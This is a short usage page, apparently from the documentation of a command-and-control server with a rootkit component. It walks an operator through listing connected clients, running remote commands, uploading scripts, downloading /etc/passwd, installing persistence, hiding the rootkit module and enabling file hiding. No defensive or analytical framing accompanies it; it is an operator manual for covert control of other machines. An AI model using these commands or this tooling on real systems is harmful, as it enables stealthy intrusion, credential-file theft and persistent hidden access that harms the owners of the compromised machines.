---
title: "Usage"
description: "How to use the C2 server"
icon: "play_arrow"
weight: 304
---

## Start Server

```bash
./deploy_c2.sh --c2        # Start C2 server + Web UI
```

## Basic Workflow

```bash
# 1. List clients
clients
# Index | Client Name | Status         | Last Seen
#   1   | Client-1    | UNAUTHENTICATED| 6:13:29 PM

# 2. Authenticate  
auth 1 password
# ✓ Authentication successful

# 3. Execute commands
exec 1 whoami
exec 1 uname -a
exec 1 ps aux

# 4. Transfer files
upload 1 script.sh          # Upload to client
download 1 /etc/passwd      # Download from client

# 5. Configure
config 1                    # Interactive menu
persist install 1           # Install persistence
```

## File Operations

```bash
ls 1 /home                  # List directory
upload 1 ./file.txt         # Upload (to current dir)
upload 1 ./file.txt /tmp/   # Upload to specific path
download 1 /etc/hosts       # Downloads to downloads/ folder
```

## Stealth

```bash
status 1                    # Check current stealth status
hide 1                      # Hide rootkit module
enable-file-hiding 1        # Enable file hiding
```

**Access Web UI**: `http://localhost:3000` 